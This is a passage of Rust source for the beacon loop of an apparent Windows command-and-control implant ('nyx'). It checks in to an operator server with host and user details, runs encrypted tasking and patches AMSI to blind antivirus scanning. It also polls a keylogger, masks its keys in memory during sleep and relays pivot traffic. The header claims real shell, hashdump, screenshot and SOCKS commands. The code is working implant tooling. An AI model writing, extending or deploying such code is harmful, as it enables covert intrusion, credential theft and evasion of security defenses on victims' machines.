//! Beacon task loop for the PIC implant.
//!
//! Mirrors agent-dev's loop but `no_std`: check-in (SessionInfo) → every sleep
//! cycle, POST last cycle's responses, receive tasks, execute, repeat. The
//! crypto/frame layer is reused verbatim from [`nyx_protocol`]; only the
//! transport (WinHTTP) and the sleeper differ.
//!
//! The command dispatch covers every wire `Command` variant (all 28 wire
//! Command variants): file ops, shell, recon, BOF, screenshot, keylog,
//! hashdump, connect/socks relay, etc. — all route to real implementations
//! (none are stubs).

#![cfg(target_os = "windows")]

use crate::config_placeholder::{self, ImplantConfig};
use nyx_implant_core::config::{self, Config};
use nyx_implant_core::heap::{vec, String, Vec};
use nyx_protocol::{
    encode_frame_dir, open_frame_dir, parse_frame, wire::Writer, Command, Direction,
    ImplantKeypair, Response, SessionInfo, Task, TaskResponse,
};

/// Runtime-configurable sleep interval (seconds). Updated by the `Sleep`
/// command so an operator can re-task beacon cadence live. Defaults to the
/// config's `sleep_seconds`; an AtomicU32 keeps the read+write lock-free in the
/// single beacon thread.
static SLEEP_SECS: core::sync::atomic::AtomicU32 = core::sync::atomic::AtomicU32::new(5);

/// Per-implant timing override (L4 wire u8). 0 inherit / 1 uniform / 2 bursty.
static TIMING_BASELINE: core::sync::atomic::AtomicU8 = core::sync::atomic::AtomicU8::new(0);

/// Bursty cadence cycle counter (agent-dev `BURST_LEN = 4`).
static SLEEP_CYCLE: core::sync::atomic::AtomicU32 = core::sync::atomic::AtomicU32::new(0);

/// Margin kept under `protocol::frame::MAX_CT_LEN` (512 KiB) when batching
/// responses into one frame. A streamed Download or Screenshot can exceed the
/// frame cap; we flush early when the accumulated batch would cross this.
const BATCH_FLUSH: usize = 200 * 1024;

/// 单帧明文打包预算。`encode_frame_dir` 在 `plaintext + TAG_LEN > MAX_CT_LEN`
/// 时拒绝封帧——server 不可达期间 pending 缓存会跨 cycle 累积，整批封帧
/// 一旦超 512 KiB 旧代码就静默跳过（返回 None，批次永远发不出去）。打包时
/// 只取估算后能放进一帧的前缀，其余留到下一帧；1 KiB 余量覆盖 `encode_vec`
/// 的逐条 varint/tag/name 开销与 Vec 长度前缀（`response_wire_size` 已按
/// 24 字节高估逐条开销，这里的余量是双保险）。镜像 agent-dev 的 PACK_BUDGET。
const PACK_BUDGET: usize = nyx_protocol::frame::MAX_CT_LEN - nyx_protocol::TAG_LEN - 1024;

/// pending 缓存的保留上限（估算字节）。server 长时间不可达时 channel pump
/// 与任务结果会无限累积；超过上限丢弃最旧的响应并打 diag 标记（保最新），
/// 绝不允许无界增长。4 MiB 远超一帧的交付能力。镜像 agent-dev 的 PENDING_CAP。
const PENDING_CAP: usize = 4 * 1024 * 1024;

/// Pump pending window messages so rundll32's hidden window doesn't block.
/// rundll32 creates a window and expects the entry function to handle messages.
/// Without pumping, the system considers the process unresponsive and may kill it.
fn pump_window_messages() {
    // PEB-resolve PeekMessageW + DispatchMessageW + TranslateMessage from user32.dll.
    // These are no-ops if user32.dll isn't loaded (e.g. loaded into a non-GUI process).
    unsafe {
        let peek = nyx_implant_core::resolve::export_addr(b"user32.dll", b"PeekMessageW");
        let dispatch = nyx_implant_core::resolve::export_addr(b"user32.dll", b"DispatchMessageW");
        let (Some(peek), Some(dispatch)) = (peek, dispatch) else {
            return; // user32 not loaded — nothing to pump.
        };
        // PeekMessageW(msg, hwnd=NULL, 0, 0, PM_REMOVE=1) -> BOOL
        type PeekMessageW =
            unsafe extern "system" fn(*mut [u8; 48], *mut core::ffi::c_void, u32, u32, u32) -> i32;
        type DispatchMessageW = unsafe extern "system" fn(*const [u8; 48]) -> usize;
        let peek_fn: PeekMessageW = core::mem::transmute(peek);
        let dispatch_fn: DispatchMessageW = core::mem::transmute(dispatch);
        let mut msg: [u8; 48] = [0; 48]; // MSG struct on x64 = 48 bytes
        while peek_fn(&mut msg, core::ptr::null_mut(), 0, 0, 1) != 0 {
            dispatch_fn(&msg);
        }
    }
}

/// When false (noevasion mode), beacon_loop skips AMSI patching, keylog
/// polling, and channel pumping — all of which depend on the evasion init
/// (hookchain/blind) that `init_minimal` skips.
static EVASION_ACTIVE: core::sync::atomic::AtomicBool = core::sync::atomic::AtomicBool::new(true);

/// Called by entry.rs before beacon_loop to disable evasion-dependent calls.
pub fn set_evasion_off() {
    EVASION_ACTIVE.store(false, core::sync::atomic::Ordering::Release);
}

/// Whether the full evasion init (hookchain/blind/mask-region registration)
/// ran. When false (noevasion mode — `init_minimal` path), sleep masking must
/// NOT engage because `mem::mask()` never registered the .text/config/key
/// regions, and fluctuation would crash on the unmask step. `kits::sleep`
/// gates on this before routing to `fluctuation::sleep`.
pub fn evasion_active() -> bool {
    EVASION_ACTIVE.load(core::sync::atomic::Ordering::Acquire)
}

// ── Beacon state ────────────────────────────────────────────────────────────

/// Initialization state passed from [`beacon_init`] to the main loop.
struct BeaconInit {
    cfg: Config,
    implant: ImplantConfig,
    key: nyx_protocol::crypto::SessionKey,
    pubkey: [u8; 32],
    info_plain: Vec<u8>,
    rt: Option<&'static nyx_implant_core::syscalls::Runtime>,
    ch_ctx: nyx_implant_net::channels::ChannelCtx,
}

// ── Initialization ──────────────────────────────────────────────────────────

/// Load config, build keypair, enumerate host, and initialize channels.
/// Returns the beacon state on success, or returns early (via the caller)
/// when the CSPRNG fails.
unsafe fn beacon_init() -> Option<BeaconInit> {
    nyx_implant_core::diag::diag_mark(b"L0_loop_start");
    let (cfg, implant) = beacon_init_config();

    // Initialize the channel dispatcher.
    let ch_ctx = nyx_implant_net::channels::ChannelCtx::from_config(&cfg);
    nyx_implant_net::channels::set_active(nyx_implant_net::channels::Channel::from_u8(
        cfg.primary_channel,
    ));

    let (_, key, pubkey) = beacon_init_keypair(&cfg, &implant)?;
    let info_plain = beacon_init_hostinfo(&implant)?;
    let rt = nyx_implant_core::syscalls::global();
    nyx_implant_core::diag::diag_mark(b"L1_rt");

    Some(BeaconInit {
        cfg,
        implant,
        key,
        pubkey,
        info_plain,
        rt,
        ch_ctx,
    })
}

/// Load per-implant runtime config (falling back to compile-time), persist the
/// sleep interval, and register the plaintext with the memory mask.
fn beacon_init_config() -> (Config, ImplantConfig) {
    // Try per-implant runtime config first (patched .nyx_cfg section).
    // Falls back to compile-time config if the section is unpatched.
    let (cfg, implant, config_plain) =
        if let Some((c, i, p)) = config_placeholder::load_runtime_config() {
            (c, i, p)
        } else {
            let (c, p) = config::load();
            (c, ImplantConfig::default(), p)
        };
    SLEEP_SECS.store(cfg.sleep_seconds, core::sync::atomic::Ordering::Relaxed);
    TIMING_BASELINE.store(cfg.timing_baseline, core::sync::atomic::Ordering::Relaxed);

    // Leak the decrypted config plaintext and register it with the memory
    // mask so it is RC4-encrypted during sleep.
    nyx_implant_evasion::mem::register_owned(config_plain);
    (cfg, implant)
}

/// Per-implant keypair + session key, registered with the memory mask.
fn beacon_init_keypair(
    cfg: &Config,
    implant: &ImplantConfig,
) -> Option<(ImplantKeypair, nyx_protocol::crypto::SessionKey, [u8; 32])> {
    // Per-implant keypair.
    let kp = if let Some(ref priv_bytes) = implant.implant_priv {
        ImplantKeypair::from_secret_bytes(*priv_bytes)
    } else {
        match ImplantKeypair::generate() {
            Ok(k) => k,
            Err(_) => {
                nyx_implant_core::diag::diag_mark(b"ERR_KEYGEN_CSPRNG");
                return None;
            }
        }
    };
    let key = match kp.session_key(&cfg.server_pub) {
        Ok(k) => k,
        Err(_) => {
            nyx_implant_core::diag::diag_mark(b"ERR_KEYEXCH_NONCONTRIB");
            return None;
        }
    };
    nyx_implant_evasion::mem::register_key(*key.as_bytes());
    let pubkey = kp.public_bytes();
    Some((kp, key, pubkey))
}

/// Real host enumeration → encoded SessionInfo plaintext.
fn beacon_init_hostinfo(implant: &ImplantConfig) -> Option<Vec<u8>> {
    // Real host enumeration.
    let info = SessionInfo {
        beacon_id: nyx_implant_core::hostinfo::beacon_id(),
        hostname: nyx_implant_core::hostinfo::hostname(),
        username: nyx_implant_core::hostinfo::username(),
        os: nyx_implant_core::hostinfo::os(),
        arch: nyx_implant_core::hostinfo::arch(),
        pid: nyx_implant_core::hostinfo::pid(),
        is_admin: nyx_implant_core::hostinfo::is_admin(),
        auth_token: implant.auth_token,
    };
    let mut info_writer = Writer::new();
    if info.encode(&mut info_writer).is_err() {
        nyx_implant_core::diag::diag_mark(b"ERR_SESSIONINFO_ENCODE");
        return None;
    }
    Some(info_writer.into_bytes())
}

// ── Check-in ────────────────────────────────────────────────────────────────

/// Run the check-in retry loop. Returns the next frame counter on success,
/// or 0 to signal the caller to fall through to the task loop anyway
/// (the server may have registered us even if we didn't get a reply).
unsafe fn beacon_checkin(
    pubkey: &[u8; 32],
    key: &nyx_protocol::crypto::SessionKey,
    info_plain: &[u8],
    cfg: &Config,
    ch_ctx: &nyx_implant_net::channels::ChannelCtx,
) -> u64 {
    const MAX_CHECKIN_RETRIES: u32 = 5;
    let mut counter = 0u64;
    let mut attempts = 0u32;
    loop {
        let frame =
            match encode_frame_dir(pubkey, Direction::ClientToServer, counter, key, info_plain) {
                Ok(f) => f,
                Err(_) => {
                    sleep_jitter(
                        SLEEP_SECS.load(core::sync::atomic::Ordering::Relaxed),
                        cfg.jitter_pct,
                    );
                    continue;
                }
            };
        counter += 1;
        nyx_implant_core::diag::diag_mark(b"L2_checkin_send");
        let resp = nyx_implant_net::channels::dispatch_send_recv(
            ch_ctx,
            nyx_implant_net::channels::get_active(),
            &frame,
        );
        nyx_implant_core::diag::diag_mark(b"L3_checkin_recv");
        if resp.is_some() {
            return counter;
        }
        attempts += 1;
        if attempts >= MAX_CHECKIN_RETRIES {
            return counter;
        }
        sleep_jitter(
            SLEEP_SECS.load(core::sync::atomic::Ordering::Relaxed),
            cfg.jitter_pct,
        );
    }
}

// ── Per-cycle helpers ───────────────────────────────────────────────────────

/// Kill-date check (fail-closed — implant-beacon-4). Returns true when the
/// implant has expired and must stop. `now_unix()` returns 0 only when the
/// clock export cannot be resolved; a kill-switch must NOT fail open because
/// the clock API is unavailable, so 0 is treated as expired (the hostinfo
/// "0 = unknown, do not enforce" contract is deliberately overridden HERE —
/// expiry is the one control that must fail closed). No-op when no kill-date
/// is configured (`expires_at == 0`).
fn kill_date_reached(implant: &ImplantConfig) -> bool {
    if implant.expires_at == 0 {
        return false;
    }
    let now = nyx_implant_core::hostinfo::now_unix();
    now == 0 || now >= implant.expires_at
}

/// Enforce kill-date, retry AMSI blinding, sleep, pump messages, poll keylog,
/// drain relay sockets. Returns true if the beacon should continue.
fn beacon_cycle_setup(
    implant: &ImplantConfig,
    cycle: &mut u32,
    amsi_patched: &mut bool,
    cfg: &Config,
    pending: &mut Vec<TaskResponse>,
) -> bool {
    // Kill-date enforcement (fail-closed: an unreadable clock counts as
    // expired rather than disabling the kill switch).
    if kill_date_reached(implant) {
        return false;
    }
    // Retry AMSI blinding: capped at 10 cycles.
    if EVASION_ACTIVE.load(core::sync::atomic::Ordering::Acquire) && !*amsi_patched && *cycle < 10 {
        unsafe {
            nyx_implant_evasion::blind::maybe_patch_amsi();
        }
        *amsi_patched = nyx_implant_evasion::blind::amsi_patched();
    }
    let secs = SLEEP_SECS.load(core::sync::atomic::Ordering::Relaxed);
    *cycle = cycle.saturating_add(1);
    pump_window_messages();
    sleep_jitter(secs, cfg.jitter_pct);
    // Poll keyboard once per cycle.
    if EVASION_ACTIVE.load(core::sync::atomic::Ordering::Acquire) {
        crate::keylog::poll_once();
    }
    // Drain relay sockets. Deliberately NOT gated on EVASION_ACTIVE: pivoting
    // (Connect/Socks/ChannelData) must keep working on the noevasion build too
    // — a P2P/relay deployment is transport behaviour, not evasion behaviour,
    // and the operator may legitimately run the implant with evasion disabled
    // (e.g. NYX_NOEVASION=1) while still relaying through it.
    for r in crate::pivot::pump_channels() {
        pending.push(TaskResponse {
            task_id: 0,
            response: r,
        });
    }
    true
}

/// Last-seen server→implant frame counter (S2C replay protection). The server
/// pre-increments its per-session `send_counter` before every S2C frame
/// (crates/server/src/lib.rs), so a fresh session's first reply has counter 1
/// and every later reply is strictly greater. An attacker replaying an old
/// server response would otherwise re-deliver stale tasks (the AEAD open would
/// even succeed, since the replayed ciphertext was sealed under the same key
/// and counter); rejecting any counter ≤ the last accepted one closes that.
/// `AtomicU64` because the same single beacon thread both reads and updates it
/// lock-free; starts at 0 so the first frame (counter ≥ 1) is always accepted.
static LAST_SERVER_COUNTER: core::sync::atomic::AtomicU64 = core::sync::atomic::AtomicU64::new(0);

/// Accept a server frame counter iff it is strictly greater than the last one
/// seen (recording it). Returns false for replayed/stale frames — the caller
/// then drops the frame without dispatching (replay protection, not a fatal
/// error). Lock-free CAS loop, safe on the single beacon thread.
fn accept_server_counter(counter: u64) -> bool {
    let mut last = LAST_SERVER_COUNTER.load(core::sync::atomic::Ordering::Relaxed);
    loop {
        if counter <= last {
            return false;
        }
        match LAST_SERVER_COUNTER.compare_exchange_weak(
            last,
            counter,
            core::sync::atomic::Ordering::Relaxed,
            core::sync::atomic::Ordering::Relaxed,
        ) {
            Ok(_) => return true,
            Err(current) => last = current,
        }
    }
}

/// Encode + send the pending batch, advancing counter on success.
/// On send failure, advances along the fallback chain resolved from
/// `fallback_bitmap` (the operator-configured `Config::fallback_bitmap`;
/// 0 = build-time default chain — see
/// `nyx_implant_net::channels::next_fallback_with_bitmap`).
///
/// Frame split + retention (wave-3, mirrors agent-dev): the cache may hold far
/// more than one frame after a server outage, so only the leading prefix that
/// fits under MAX_CT_LEN is sealed — sealing the whole batch used to fail with
/// PlaintextTooLarge and return None, silently skipping the over-limit batch
/// FOREVER (worse than a loud abort: the beacon looked alive but its results
/// never went out). The batch is also capped at PENDING_CAP (oldest dropped,
/// diag-marked) so an unreachable server can't grow it without bound.
fn beacon_send_frame(
    pubkey: &[u8; 32],
    counter: &mut u64,
    key: &nyx_protocol::crypto::SessionKey,
    pending: &mut Vec<TaskResponse>,
    ch_ctx: &nyx_implant_net::channels::ChannelCtx,
    fallback_bitmap: u8,
) -> Option<Vec<u8>> {
    // Retention bound: drop the oldest responses past PENDING_CAP and log it —
    // never grow unbounded while the server is unreachable.
    if cap_pending(pending, PENDING_CAP) > 0 {
        nyx_implant_core::diag::diag_mark(b"WARN_PENDING_CAP_DROP");
    }
    let prefix = frame_prefix_len(pending, PACK_BUDGET);
    let frame = match encode_frame_dir(
        pubkey,
        Direction::ClientToServer,
        *counter,
        key,
        &encode_batch(&mut pending[..prefix]),
    ) {
        Ok(f) => f,
        Err(_) => {
            // Estimate drift must not drop the batch: keep it (and the
            // counter) so the next cycle retries. Never silent.
            nyx_implant_core::diag::diag_mark(b"ERR_BEACON_SEAL_FRAME");
            return None;
        }
    };
    // SAFETY: same contract as the beacon_loop call sites — `ch_ctx` outlives
    // the call and the active channel's fns were resolved at bootstrap.
    let body = unsafe {
        nyx_implant_net::channels::dispatch_send_recv(
            ch_ctx,
            nyx_implant_net::channels::get_active(),
            &frame,
        )
    };
    match body {
        Some(b) => {
            // P0-3: only advance the counter (and drop the SENT prefix) once
            // the round-trip actually succeeded — mirrors the oneshot flush and
            // the mid-cycle flush below. On failure we keep `pending` and the
            // SAME counter so the next cycle re-encodes and retries the batch
            // instead of silently dropping it (or desyncing the sequence).
            *counter += 1;
            pending.drain(..prefix);
            Some(b)
        }
        None => {
            let active = nyx_implant_net::channels::get_active();
            if let Some(fb) =
                nyx_implant_net::channels::next_fallback_with_bitmap(active, fallback_bitmap)
            {
                nyx_implant_net::channels::set_active(fb);
            } else {
                nyx_implant_net::channels::set_active(nyx_implant_net::channels::PRIMARY_CHANNEL);
            }
            None
        }
    }
}

/// Decode the task batch riding a mid-flush reply frame. `None` when the
/// reply carries no usable frame (parse/AEAD/decode failure or a stale,
/// replayed counter) — a routine empty or undecodable mid-flush reply must
/// never abort the beacon loop (same decode discipline as the main cycle).
/// Mirrors agent-dev's `open_reply_tasks` (BUG-1).
fn open_reply_tasks(key: &nyx_protocol::crypto::SessionKey, body: &[u8]) -> Option<Vec<Task>> {
    let raw = parse_frame(body).ok()?;
    // Same S2C replay protection as beacon_dispatch_tasks: a mid-flush reply
    // is a real server frame with a strictly-increasing counter.
    if !accept_server_counter(raw.counter) {
        return None;
    }
    let plaintext = open_frame_dir(key, Direction::ServerToClient, &raw).ok()?;
    Task::decode_vec(&plaintext).ok()
}

/// Decode server reply into tasks, dispatch each command, and flush mid-cycle
/// when the batch exceeds BATCH_FLUSH. Tasks unpacked from mid-flush replies
/// run after the current batch, ahead of the next cycle's fetch (FIFO vs the
/// server queue — mirrors agent-dev's `deferred_tasks`, BUG-1).
unsafe fn beacon_dispatch_tasks(
    body: &[u8],
    key: &nyx_protocol::crypto::SessionKey,
    pubkey: &[u8; 32],
    counter: &mut u64,
    cfg: &Config,
    rt: Option<&'static nyx_implant_core::syscalls::Runtime>,
    ch_ctx: &nyx_implant_net::channels::ChannelCtx,
    pending: &mut Vec<TaskResponse>,
) -> bool {
    let Ok(raw) = parse_frame(body) else {
        return true;
    };
    // S2C replay protection: drop frames whose server counter is not strictly
    // greater than the last accepted one (stale/replayed response). Returning
    // true keeps the beacon loop running — the next cycle's POST gets a fresh
    // server reply.
    if !accept_server_counter(raw.counter) {
        return true;
    }
    let Ok(plaintext) = open_frame_dir(key, Direction::ServerToClient, &raw) else {
        return true;
    };
    let Ok(tasks) = Task::decode_vec(&plaintext) else {
        return true;
    };

    // Tasks unpacked from mid-flush reply frames (BUG-1). They were dequeued
    // server-side, so dropping them is not an option; they run in rounds
    // behind the batch that was being dispatched when they arrived.
    let mut deferred: Vec<Task> = Vec::new();
    let mut round = tasks;
    loop {
        for t in round {
            if matches!(t.command, Command::Exit) {
                return false;
            }
            for response in
                crate::task_guard::run(|| execute(rt, t.command, counter, pubkey, key, cfg))
            {
                pending.push(TaskResponse {
                    task_id: t.task_id,
                    response,
                });
                // 保留上限：flush 反复失败（server 不可达）时大型流式结果会
                // 无界堆积——丢最旧、打 diag 标记，绝不允许撑爆内存（镜像
                // agent-dev 的 PENDING_CAP 纪律）。
                if cap_pending(pending, PENDING_CAP) > 0 {
                    nyx_implant_core::diag::diag_mark(b"WARN_PENDING_CAP_DROP");
                }
                // Flush mid-cycle if batch nears frame cap; any tasks riding
                // the flush reply are deferred behind the current batch.
                beacon_dispatch_flush(pubkey, counter, key, pending, ch_ctx, &mut deferred);
            }
        }
        if deferred.is_empty() {
            break;
        }
        round = core::mem::take(&mut deferred);
    }
    true
}

/// Flush mid-cycle if the pending batch nears the frame cap. On encode or
/// send failure the batch is kept (and the counter unchanged) so the next
/// cycle re-encodes and retries it — mirrors the oneshot and end-of-cycle
/// flushes.
///
/// NOT fire-and-forget (BUG-1): the server packs newly-queued tasks into
/// EVERY beacon reply, mid-flush ones included
/// (`handle_existing_session_pack_tasks` dequeues `s.pending` into each
/// response). The reply body is therefore consumed and any tasks it carries
/// are appended to `deferred` so the caller dispatches them behind the
/// current batch — the old code dropped the body and those tasks evaporated
/// server-side without ever executing.
fn beacon_dispatch_flush(
    pubkey: &[u8; 32],
    counter: &mut u64,
    key: &nyx_protocol::crypto::SessionKey,
    pending: &mut Vec<TaskResponse>,
    ch_ctx: &nyx_implant_net::channels::ChannelCtx,
    deferred: &mut Vec<Task>,
) {
    if pending_batch_size(pending) > BATCH_FLUSH {
        // Frame split (wave-3): a failed flush leaves the batch in `pending`,
        // so after a server outage it can hold far more than one frame. Seal
        // only the leading prefix that fits under MAX_CT_LEN — the old
        // whole-batch seal failed with PlaintextTooLarge and silently kept an
        // undeliverable batch forever.
        let prefix = frame_prefix_len(pending, PACK_BUDGET);
        let frame = match encode_frame_dir(
            pubkey,
            Direction::ClientToServer,
            *counter,
            key,
            &encode_batch(&mut pending[..prefix]),
        ) {
            Ok(f) => f,
            Err(_) => {
                nyx_implant_core::diag::diag_mark(b"ERR_BEACON_SEAL_FLUSH");
                return;
            }
        };
        // SAFETY: same contract as the beacon_loop call sites — `ch_ctx`
        // outlives the call and the active channel's fns were resolved at
        // bootstrap.
        let sent = unsafe {
            nyx_implant_net::channels::dispatch_send_recv(
                ch_ctx,
                nyx_implant_net::channels::get_active(),
                &frame,
            )
        };
        if let Some(body) = sent {
            *counter += 1;
            pending.drain(..prefix);
            // Consume the reply: tasks queued while a large streamed result
            // (screenshot/download) was mid-flush ride this frame.
            if let Some(mut tasks) = open_reply_tasks(key, &body) {
                deferred.append(&mut tasks);
            }
        }
    }
}

// ── Main loop ───────────────────────────────────────────────────────────────

/// The beacon loop, called from `nyx_entry` after resolve + alloc bootstrap.
///
/// Returns an exit code so the entry points can report why the loop ended:
///   - `0xAF`: `beacon_init` failed (CSPRNG keygen / SessionInfo encode) —
///     the "0xAF family" init-failure code, mirroring `beacon_oneshot`'s 0xAF
///   - `0x00`: loop terminated normally (kill-date reached or `Exit` task)
pub unsafe fn beacon_loop() -> u32 {
    let init = match beacon_init() {
        Some(s) => s,
        None => return 0xAF, // init failed — distinct exit code (0xAF family)
    };
    let BeaconInit {
        cfg,
        implant,
        key,
        pubkey,
        info_plain,
        rt,
        ch_ctx,
        ..
    } = init;

    // Kill-date fail-closed BEFORE the first check-in (implant-beacon-4): the
    // old check ran only after the check-in round-trip, so an expired implant
    // still phoned home and registered server-side. An expired beacon stops
    // now, before any traffic.
    if kill_date_reached(&implant) {
        return 0x00;
    }

    // Check-in retry.
    let mut counter = beacon_checkin(&pubkey, &key, &info_plain, &cfg, &ch_ctx);

    // Task loop.
    let mut pending: Vec<TaskResponse> = Vec::new();
    let mut cycle: u32 = 0;
    let mut amsi_patched = false;
    loop {
        if !beacon_loop_cycle(
            &implant,
            &mut cycle,
            &mut amsi_patched,
            &cfg,
            &mut pending,
            &pubkey,
            &mut counter,
            &key,
            &ch_ctx,
            rt,
        ) {
            return 0x00; // kill-date reached or Exit task — deliberate clean stop
        }
    }
}

/// One beacon cycle: per-cycle setup (kill-date, AMSI, sleep, keylog,
/// channel drain), encode+send the pending batch, and dispatch the server
/// reply. Returns false when the loop should stop (kill-date reached or
/// `Exit` task received).
unsafe fn beacon_loop_cycle(
    implant: &ImplantConfig,
    cycle: &mut u32,
    amsi_patched: &mut bool,
    cfg: &Config,
    pending: &mut Vec<TaskResponse>,
    pubkey: &[u8; 32],
    counter: &mut u64,
    key: &nyx_protocol::crypto::SessionKey,
    ch_ctx: &nyx_implant_net::channels::ChannelCtx,
    rt: Option<&'static nyx_implant_core::syscalls::Runtime>,
) -> bool {
    // Per-cycle setup: kill-date, AMSI, sleep, keylog, channel drain.
    if !beacon_cycle_setup(implant, cycle, amsi_patched, cfg, pending) {
        return false; // kill-date reached — deliberate clean stop
    }

    // Encode + send pending batch, receive server reply.
    let Some(body) = beacon_send_frame(pubkey, counter, key, pending, ch_ctx, cfg.fallback_bitmap)
    else {
        return true; // send failed — retry next cycle
    };

    // Decode reply, dispatch tasks, flush mid-cycle.
    if !beacon_dispatch_tasks(&body, key, pubkey, counter, cfg, rt, ch_ctx, pending) {
        return false; // Exit task received — deliberate clean stop
    }
    true
}

/// **Integration-test entry**: run the real beacon check-in + ONE task cycle
/// against the configured server, then exit with a status code. Exercises the
/// full production path — config load, ECDH session key, WinHTTP POST, frame
/// AEAD encode/decode, SessionInfo check-in, task decode, command dispatch,
/// response encode — without the infinite loop. Invoke via
/// `rundll32 nyx_implant_win.dll,nyx_beacon_oneshot`.
///
/// Exit codes:
///   1 = check-in succeeded (SessionInfo accepted by the server)
///       its response POSTed back (full round-trip)
///   0x00 = kill-date reached — deliberate stop before check-in (fail-closed
///       expiry, implant-beacon-4)
///   0xC0..0xCF = a specific step failed (see inline comments)
#[allow(unused_assignments)]
pub unsafe fn beacon_oneshot() -> u32 {
    let (cfg, implant) = match beacon_oneshot_load() {
        Ok(c) => c,
        Err(code) => return code,
    };
    // DIAG step 1: config loaded OK
    nyx_implant_core::diag::diag_mark(b"b1_config");

    // Initialize channel dispatcher (same as beacon_loop).
    let ch_ctx = nyx_implant_net::channels::ChannelCtx::from_config(&cfg);
    nyx_implant_net::channels::set_active(nyx_implant_net::channels::Channel::from_u8(
        cfg.primary_channel,
    ));
    nyx_implant_core::diag::diag_mark(b"b2_channel");

    let (key, pubkey) = match beacon_oneshot_keygen(&cfg, &implant) {
        Ok(k) => k,
        Err(code) => return code,
    };
    let info_plain = match beacon_oneshot_sessioninfo(&implant) {
        Ok(plain) => plain,
        Err(code) => return code,
    };
    let rt = nyx_implant_core::syscalls::global();
    nyx_implant_core::diag::diag_mark(b"b5_info");

    // ---- check-in (retry up to ~30s) ----
    let mut counter = match beacon_oneshot_checkin(&pubkey, &key, &info_plain, &ch_ctx) {
        Ok(c) => c,
        Err(code) => return code,
    };

    // ---- poll for tasks (a few short cycles to give the operator time to
    // queue one via POST /api/task) ----
    let Some(tasks) = (match beacon_oneshot_poll(&pubkey, &mut counter, &key, &ch_ctx) {
        Ok(t) => t,
        Err(code) => return code,
    }) else {
        return 1;
    };
    beacon_oneshot_run_tasks(&pubkey, &mut counter, &key, &cfg, rt, &ch_ctx, tasks);
    2
}

/// Load per-implant config (falling back to compile-time), register the
/// plaintext with the memory mask, and enforce the fail-closed kill-date.
/// Err(0x00) = kill-date reached — deliberate stop before check-in.
fn beacon_oneshot_load() -> Result<(Config, ImplantConfig), u32> {
    // Try per-implant config first, fall back to compile-time (dev path).
    let (cfg, implant, config_plain) =
        if let Some((c, i, p)) = config_placeholder::load_runtime_config() {
            (c, i, p)
        } else {
            let (c, p) = config::load();
            (c, ImplantConfig::default(), p)
        };
    nyx_implant_evasion::mem::register_owned(config_plain);
    // Kill-date fail-closed (implant-beacon-4): the oneshot entry must not run
    // past its expiry — mirrors beacon_loop's pre-check-in gate. Exit cleanly
    // with the loop's deliberate-stop code.
    if kill_date_reached(&implant) {
        return Err(0x00);
    }
    Ok((cfg, implant))
}

/// Per-implant keypair + session key, registered with the memory mask.
/// Err(code) = the caller's exit code (0xAF CSPRNG, 0xB0 key exchange).
fn beacon_oneshot_keygen(
    cfg: &Config,
    implant: &ImplantConfig,
) -> Result<(nyx_protocol::crypto::SessionKey, [u8; 32]), u32> {
    let kp = if let Some(ref priv_bytes) = implant.implant_priv {
        ImplantKeypair::from_secret_bytes(*priv_bytes)
    } else {
        match ImplantKeypair::generate() {
            Ok(k) => k,
            Err(_) => {
                nyx_implant_core::diag::diag_mark(b"ERR_ONESHOT_CSPRNG");
                return Err(0xAF); // CSPRNG failure exit code
            }
        }
    };
    // DIAG step 2: keygen done (if we crash here → CSPRNG or curve25519)
    nyx_implant_core::diag::diag_mark(b"b3_keygen");
    let key = match kp.session_key(&cfg.server_pub) {
        Ok(k) => k,
        Err(_) => {
            nyx_implant_core::diag::diag_mark(b"ERR_ONESHOT_KEYEXCH");
            return Err(0xB0); // non-contributory key exchange failure exit code
        }
    };
    // DIAG step 3: session_key (HKDF) done
    nyx_implant_core::diag::diag_mark(b"b4_skey");
    nyx_implant_evasion::mem::register_key(*key.as_bytes());
    let pubkey = kp.public_bytes();
    Ok((key, pubkey))
}

/// Real host enumeration → encoded SessionInfo plaintext.
/// Err(code) = the caller's exit code (0xC2 encode failed).
fn beacon_oneshot_sessioninfo(implant: &ImplantConfig) -> Result<Vec<u8>, u32> {
    let info = SessionInfo {
        beacon_id: nyx_implant_core::hostinfo::beacon_id(),
        hostname: nyx_implant_core::hostinfo::hostname(),
        username: nyx_implant_core::hostinfo::username(),
        os: nyx_implant_core::hostinfo::os(),
        arch: nyx_implant_core::hostinfo::arch(),
        pid: nyx_implant_core::hostinfo::pid(),
        is_admin: nyx_implant_core::hostinfo::is_admin(),
        auth_token: implant.auth_token,
    };
    let mut info_writer = Writer::new();
    // P0-4: bail out with a failure exit code instead of panicking. See the
    // matching note in beacon_loop — SessionInfo is bounded, so this branch is
    // effectively unreachable, but panic=abort makes a bare expect fatal.
    if info.encode(&mut info_writer).is_err() {
        nyx_implant_core::diag::diag_mark(b"ERR_ONESHOT_SESSIONINFO");
        return Err(0xC2); // SessionInfo encode failed (malformed Writer state)
    }
    Ok(info_writer.into_bytes())
}

/// Check-in retry loop (up to ~30s). Returns the next frame counter on success.
/// Err(code) = the caller's exit code (0xC3 seal, 0xC1 check-in failed).
fn beacon_oneshot_checkin(
    pubkey: &[u8; 32],
    key: &nyx_protocol::crypto::SessionKey,
    info_plain: &[u8],
    ch_ctx: &nyx_implant_net::channels::ChannelCtx,
) -> Result<u64, u32> {
    let mut counter = 0u64;
    let mut checked_in = false;
    for _ in 0..10 {
        let frame =
            match encode_frame_dir(pubkey, Direction::ClientToServer, counter, key, info_plain) {
                Ok(f) => f,
                Err(_) => {
                    nyx_implant_core::diag::diag_mark(b"ERR_ONESHOT_SEAL_CHECKIN");
                    return Err(0xC3); // check-in frame seal failed (AEAD alloc failure)
                }
            };
        counter += 1;
        nyx_implant_core::diag::diag_mark(b"b6_send");
        if unsafe {
            nyx_implant_net::channels::dispatch_send_recv(
                ch_ctx,
                nyx_implant_net::channels::get_active(),
                &frame,
            )
        }
        .is_some()
        {
            checked_in = true;
            nyx_implant_core::diag::diag_mark(b"b7_sent");
            break;
        }
        sleep_jitter(3, 0);
    }
    if !checked_in {
        return Err(0xC1); // check-in failed (server unreachable / crypto mismatch)
    }
    Ok(counter)
}

/// Poll for queued tasks (up to 6 short cycles). Returns Some(tasks) when a
/// non-empty batch arrives, None when the poll window is exhausted.
/// Err(code) = the caller's exit code (0xC3 seal failed).
fn beacon_oneshot_poll(
    pubkey: &[u8; 32],
    counter: &mut u64,
    key: &nyx_protocol::crypto::SessionKey,
    ch_ctx: &nyx_implant_net::channels::ChannelCtx,
) -> Result<Option<Vec<Task>>, u32> {
    for _ in 0..6 {
        nyx_implant_core::diag::diag_mark(b"b7a_before_sleep");
        sleep_jitter(2, 0);
